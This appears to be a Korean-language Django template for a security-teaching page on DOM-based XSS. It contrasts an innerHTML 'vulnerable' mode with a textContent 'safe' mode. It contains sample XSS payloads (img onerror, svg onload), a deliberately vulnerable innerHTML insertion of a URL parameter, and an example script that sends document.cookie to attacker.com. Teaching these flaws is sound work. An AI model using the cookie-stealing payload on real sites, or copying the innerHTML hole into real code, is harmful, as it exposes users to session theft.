@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DOM-based XSS 테스트</title>
+  {% load static %}
+  <link rel="stylesheet" href="{% static 'css/common.css' %}">
+  <link rel="stylesheet" href="{% static 'css/test-pages.css' %}">
+</head>
+<body>
+  <div class="container">
+    <h1>DOM-based XSS 테스트</h1>
+
+    <div class="description">
+      <strong>DOM-based XSS란?</strong><br>
+      서버를 거치지 않고 클라이언트(브라우저)의 JavaScript에서 URL 파라미터를 직접 DOM에 삽입할 때 발생하는 XSS 공격입니다.
+      서버 로그에도 남지 않아 탐지가 어렵습니다.
+    </div>
+
+    <div class="mode-selector">
+      <p><strong>테스트 모드를 선택하세요</strong></p>
+      <button class="mode-btn vulnerable-btn" onclick="setMode('vulnerable', this)">
+        ❌ 취약코드 (innerHTML)
+      </button>
+      <button class="mode-btn safe-btn" onclick="setMode('safe', this)">
+        ✅ 안전코드 (textContent)
+      </button>
+    </div>
+
+    <div class="info-box">
+      <strong>📝 테스트 방법</strong><br>
+      아래 버튼을 클릭하여 빠르게 테스트하거나, URL에 직접 name 파라미터를 추가하세요
+
+      <div style="margin: 15px 0; padding: 15px; background: white; border-radius: 5px; border: 2px solid #2196F3;">
+        <strong>🚀 빠른 테스트</strong><br><br>
+
+        <a href="?name=홍길동" style="display: inline-block; padding: 10px 20px; background: #4CAF50; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
+          ✅ 정상 입력
+        </a>
+
+        <a href="?name=<img src=x onerror=alert('XSS 공격!')>" style="display: inline-block; padding: 10px 20px; background: #f44336; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
+          ❌ IMG XSS
+        </a>
+
+        <a href="?name=<svg onload=alert('SVG XSS!')>" style="display: inline-block; padding: 10px 20px; background: #f44336; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
+          ❌ SVG XSS
+        </a>
+        
+        <p style="margin-top: 10px; color: #666; font-size: 14px;">
+          💡 링크를 클릭한 후 위의 <strong>"취약코드"</strong> 또는 <strong>"안전코드"</strong> 버튼을 눌러보세요!
+        </p>
+      </div>
+    </div>
+
+    <div class="result-box">
+      <h3>실행 결과</h3>
+
+      <!-- 현재 URL 표시 -->
+      <p><strong>현재 URL</strong></p>
+      <div class="code" style="margin-bottom: 15px;">
+        <div id="current-url-encoded" style="word-break: break-all; color: #666;"></div>
+      </div>
+
+      <p><strong>디코딩된 URL</strong></p>
+      <div class="code" style="margin-bottom: 20px;">
+        <div id="current-url-decoded" style="word-break: break-all;"></div>
+      </div>
+
+      <!-- 실행 결과 -->
+      <p><strong>결과:</strong></p>
+      <div id="greeting" style="padding: 20px; background: #fff; border: 2px solid #2196F3; border-radius: 8px; min-height: 80px; font-size: 16px;">
+        <div style="color: #999; text-align: center; padding: 20px;">
+          ✨ URL에 name 파라미터를 추가한 후<br>
+          위의 <strong>"취약코드"</strong> 또는 <strong>"안전코드"</strong> 버튼을 눌러보세요!
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-example">
+      <h3>공격 예제</h3>
+      <p><strong>정상 URL</strong></p>
+      <div class="code">
+        ?name=홍길동
+      </div>
+      <p><strong>악의적 URL</strong></p>
+      <div class="code">
+        ?name=&lt;img src=x onerror=alert('XSS')&gt;<br>
+        ?name=&lt;script&gt;document.location='http://attacker.com?cookie='+document.cookie&lt;/script&gt;
+      </div>
+
+      <h4>💡 취약한 코드 vs 안전한 코드</h4>
+      <div class="code">
+        // ❌ 취약 (innerHTML 사용)<br>
+        element.innerHTML = "안녕하세요, " + name + "님!";<br>
+        // HTML 태그가 파싱되어 스크립트 실행<br>
+        <br>
+        // ✅ 안전 (textContent 사용)<br>
+        element.textContent = "안녕하세요, " + name + "님!";<br>
+        // 모든 입력을 텍스트로만 처리
+      </div>
+    </div>
+
+    <div class="links">
+      <a href="{% url 'index' %}">🏠 메인으로</a>
+    </div>
+  </div>
+
+  <script>
+    let currentMode = null;
+
+    // 현재 URL 표시 (인코딩 + 디코딩)
+    function updateCurrentURL() {
+      // 인코딩된 URL (원본)
+      document.getElementById('current-url-encoded').textContent = window.location.href;
+
+      // 디코딩된 URL
+      try {
+        const decodedURL = decodeURIComponent(window.location.href);
+        document.getElementById('current-url-decoded').textContent = decodedURL;
+      } catch (e) {
+        document.getElementById('current-url-decoded').textContent = window.location.href;
+      }
+    }
+
+    function setMode(mode, buttonElement) {
+      currentMode = mode;
+
+      // 버튼 활성화 표시
+      document.querySelectorAll('.mode-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      if (buttonElement) {
+        buttonElement.classList.add('active');
+      }
+
+      // URL에서 name 파라미터 가져오기
+      const params = new URLSearchParams(window.location.search);
+      const name = params.get("name") || "손님";
+
+      const greetingElement = document.getElementById("greeting");
+
+      if (mode === 'vulnerable') {
+        // ❌ 취약한 코드 - innerHTML 사용
+        greetingElement.innerHTML =
+          '<div style="padding: 10px; background: #ffebee; border-left: 4px solid #f44336; border-radius: 5px;">' +
+          '<strong style="color: #c62828;">❌ 취약 모드 실행</strong><br><br>' +
+          '<div style="font-size: 18px; color: #333;">안녕하세요, ' + name + '님!</div>' +
+          '</div>';
+      } else {
+        // ✅ 안전한 코드 - textContent 사용
+        const safeDiv = document.createElement('div');
+        safeDiv.style.cssText = 'padding: 10px; background: #e8f5e9; border-left: 4px solid #4caf50; border-radius: 5px;';
+
+        const modeText = document.createElement('strong');
+        modeText.style.color = '#2e7d32';
+        modeText.textContent = '✅ 안전 모드 실행';
+
+        const br1 = document.createElement('br');
+        const br2 = document.createElement('br');
+
+        const greetingText = document.createElement('div');
+        greetingText.style.cssText = 'font-size: 18px; color: #333;';
+        greetingText.textContent = '안녕하세요, ' + name + '님!';
+
+        safeDiv.appendChild(modeText);
+        safeDiv.appendChild(br1);
+        safeDiv.appendChild(br2);
+        safeDiv.appendChild(greetingText);
+
+        greetingElement.innerHTML = '';
+        greetingElement.appendChild(safeDiv);
+      }
+    }
+
+    // 페이지 로드 시 URL 표시 및 name 확인
+    window.addEventListener('DOMContentLoaded', () => {
+      updateCurrentURL();
+
+      const params = new URLSearchParams(window.location.search);
+      if (params.has('name')) {
+        // name 파라미터가 있으면 자동으로 안전 모드 실행
+        setMode('safe', null);
+        document.querySelector('.safe-btn').classList.add('active');
+      }
+    });
+  </script>
+</body>
+</html>
